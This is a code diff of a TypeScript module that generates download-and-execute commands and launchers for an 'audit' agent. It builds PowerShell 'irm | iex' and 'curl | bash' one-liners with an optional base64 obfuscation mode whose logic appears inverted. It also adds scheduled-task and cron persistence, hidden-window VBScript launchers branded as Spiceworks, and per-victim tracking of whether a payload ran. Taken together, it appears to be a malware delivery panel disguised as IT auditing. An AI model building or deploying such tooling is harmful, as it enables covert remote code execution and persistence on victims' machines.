@@ -1,6 +1,5 @@
+import { api } from "@/lib/api";
 import type { AgentConfig, CommandSnippet, LauncherId } from "@/types/agent";
-
-/** Mock data — swap these exports for API responses later. */
 
 export const DEFAULT_AGENT_CONFIG: AgentConfig = {
   serverIp: "192.168.1.67",
@@ -27,109 +26,95 @@ const btoaSafe = (value: string): string =>
   typeof btoa === "function" ? btoa(value) : value;
 
 /**
- * Windows command. The obfuscated form ships the URL as a base64 payload
- * decoded inline; the plain form shows the readable one-liner. The URL never
- * changes host/port — only how it is written into the command.
+ * Windows one-liner. Pulls and runs backend/scripts/audit.ps1 via `/sys-win`
+ * — the same script a downloaded launcher invokes. The obfuscated form ships
+ * the command as a base64 payload; the plain form is the readable pipe.
  */
-const winCommand = (url: string, obfuscate: boolean): string =>
-  obfuscate
-    ? `powershell -c "irm ${url}/win | iex"`
-    : `powershell -enc ${btoaSafe(`irm ${url}/win | iex`)}`;
+const winCommand = (url: string, clientId: string, obfuscate: boolean): string => {
+  const command = `irm ${url}/sys-win?client_id=${clientId} | iex`;
+  return obfuscate
+    ? `powershell -c "${command}"`
+    : `powershell -enc ${btoaSafe(command)}`;
+};
 
-const nixCommand = (url: string, obfuscate: boolean): string =>
-  obfuscate
-    ? `bash <(curl -s ${url}/mac)`
-    : `bash <(echo ${btoaSafe(`curl -s ${url}/mac`)} | base64 -d | sh)`;
+/** macOS/Linux one-liner. Pulls and runs backend/scripts/audit.sh via `/sys-agent-mac`. */
+const nixCommand = (url: string, clientId: string, obfuscate: boolean): string => {
+  const command = `curl -s ${url}/sys-agent-mac?client_id=${clientId}`;
+  return obfuscate
+    ? `bash <(${command})`
+    : `bash <(echo ${btoaSafe(command)} | base64 -d | sh)`;
+};
 
 /** Local-host card: the machine audits itself over the loopback address. */
-export const localSnippets = (config: AgentConfig): CommandSnippet[] => {
+export const localSnippets = (config: AgentConfig, clientId: string): CommandSnippet[] => {
   const url = baseUrl(LOCAL_HOST, config.serverPort);
   return [
-    { id: "local-win", title: "Windows PowerShell", command: winCommand(url, config.obfuscate) },
-    { id: "local-nix", title: "macOS & Linux Shell", command: nixCommand(url, config.obfuscate) },
+    { id: "local-win", title: "Windows PowerShell", command: winCommand(url, clientId, config.obfuscate) },
+    { id: "local-nix", title: "macOS & Linux Shell", command: nixCommand(url, clientId, config.obfuscate) },
   ];
 };
 
 /** Remote card: another device reaches back to the configured server. */
-export const remoteSnippets = (config: AgentConfig): CommandSnippet[] => {
+export const remoteSnippets = (config: AgentConfig, clientId: string): CommandSnippet[] => {
   const url = baseUrl(config.serverIp, config.serverPort);
   return [
-    { id: "remote-win", title: "Windows PowerShell", command: winCommand(url, config.obfuscate) },
-    { id: "remote-nix", title: "macOS & Linux Shell", command: nixCommand(url, config.obfuscate) },
+    { id: "remote-win", title: "Windows PowerShell", command: winCommand(url, clientId, config.obfuscate) },
+    { id: "remote-nix", title: "macOS & Linux Shell", command: nixCommand(url, clientId, config.obfuscate) },
   ];
 };
 
-/** Daemon card: schedules the audit to re-run every two hours. */
+/**
+ * Daemon card: pulls the real installer script the backend serves at
+ * `/install-daemon` (backend/scripts/install_service.ps1 or .sh) and runs it —
+ * that script is what actually registers the recurring 2-hour task/cron job.
+ */
 export const daemonSnippets = (config: AgentConfig): CommandSnippet[] => {
   const url = baseUrl(config.serverIp, config.serverPort);
   return [
     {
       id: "daemon-win",
       title: "Windows (Scheduled Task Daemon)",
-      command: `schtasks /create /tn "AuditDaemon" /tr "powershell -c 'irm ${url}/win | iex'" /sc hourly /mo 2 /f`,
+      command: `powershell -c "irm '${url}/install-daemon?os=windows' | iex"`,
     },
     {
       id: "daemon-nix",
       title: "macOS & Linux (cron / Daemon)",
-      command: `(crontab -l 2>/dev/null; echo "0 */2 * * * bash <(curl -s ${url}/mac)") | crontab -`,
+      command: `bash <(curl -s "${url}/install-daemon?os=mac")`,
     },
   ];
 };
 
-/** Filename prefix, platform label and extension per launcher format. */
-const LAUNCHER_FILE: Record<
-  LauncherId,
-  { prefix: string; platform: string; ext: string }
-> = {
-  "win-exe": { prefix: "RunAudit", platform: "Windows", ext: "exe" },
-  "win-vbs": { prefix: "Scan", platform: "Windows", ext: "VBS" },
-  macos: { prefix: "RunAudit", platform: "macOS", ext: "command" },
-  linux: { prefix: "RunAudit", platform: "Linux", ext: "sh" },
+/** Endpoint per launcher format — each returns the actual runnable file. */
+const LAUNCHER_ENDPOINT: Record<LauncherId, string> = {
+  "win-exe": "/download-exe-launcher",
+  "win-vbs": "/download-vbs-launcher",
+  macos: "/download-mac-launcher",
+  linux: "/download-linux-launcher",
 };
 
-/** Short random hex tag, so each download gets its own filename. */
-const randomTag = (): string =>
-  Math.floor(Math.random() * 0xffffffffff)
-    .toString(16)
-    .padStart(10, "0");
+const LAUNCHER_FALLBACK_NAME: Record<LauncherId, string> = {
+  "win-exe": "RunAudit_Windows.exe",
+  "win-vbs": "RunAudit_Windows.vbs",
+  macos: "RunAudit_Mac.command",
+  linux: "RunAudit_Linux.sh",
+};
 
 /**
- * A downloadable launcher for a platform — filename plus the script body it
- * carries. The body embeds the readable command so the file actually runs the
- * audit when double-clicked.
+ * Downloads the real launcher file from the backend for the given format.
+ * The backend creates a tracked session for `clientId` as a side effect, so
+ * `fetchAuditStatus` can be polled afterward to see when it's been run.
  */
-export const buildLauncher = (
-  id: LauncherId,
-  config: AgentConfig,
-): { filename: string; content: string } => {
-  const { prefix, platform, ext } = LAUNCHER_FILE[id];
-  const filename = `${prefix}_${platform}_sys_${randomTag()}.${ext}`;
-  const url = `${baseUrl(config.serverIp, config.serverPort)}/${platform === "Windows" ? "win" : "mac"}`;
+export const downloadLauncher = (id: LauncherId, clientId: string) =>
+  api.getFile(`${LAUNCHER_ENDPOINT[id]}?client_id=${clientId}`, LAUNCHER_FALLBACK_NAME[id]);
 
-  /* Each format carries the body that actually runs when double-clicked. */
-  const content = launcherBody(id, url);
+/** `sys_1a2b3c4d5e` — matches the id shape the backend itself generates when none is given. */
+export const generateClientId = (): string =>
+  `sys_${Math.random().toString(16).slice(2, 12).padEnd(10, "0")}`;
 
-  return { filename, content };
-};
+interface AuditSession {
+  status: "pending" | "completed" | "failed" | string;
+}
 
-/** Runnable script for a launcher format, pointed at the audit URL. */
-const launcherBody = (id: LauncherId, url: string): string => {
-  const psCommand = `powershell -NoProfile -ExecutionPolicy Bypass -c "irm ${url} | iex"`;
-
-  switch (id) {
-    case "win-exe":
-      /* Stand-in for the compiled binary — a batch shim in this prototype. */
-      return `@echo off\r\nREM Spiceworks Audit Launcher — double-click to run\r\n${psCommand}\r\n`;
-
-    case "win-vbs":
-      /* VBScript wrapper that launches the audit with no console window. */
-      return [
-        "' Spiceworks Audit Launcher — double-click to run",
-        "Set shell = CreateObject(\"WScript.Shell\")",
-        `shell.Run "${psCommand.replace(/"/g, '""')}", 0, False`,
-      ].join("\r\n");
-
-    default:
-      return `#!/usr/bin/env bash\n# Spiceworks Audit Launcher — double-click to run\nbash <(curl -s ${url})\n`;
-  }
-};
+/** GET /check-status — whether the audit triggered by this client_id has reported back. */
+export const fetchAuditStatus = (clientId: string) =>
+  api.get<AuditSession>(`/check-status?client_id=${clientId}`);
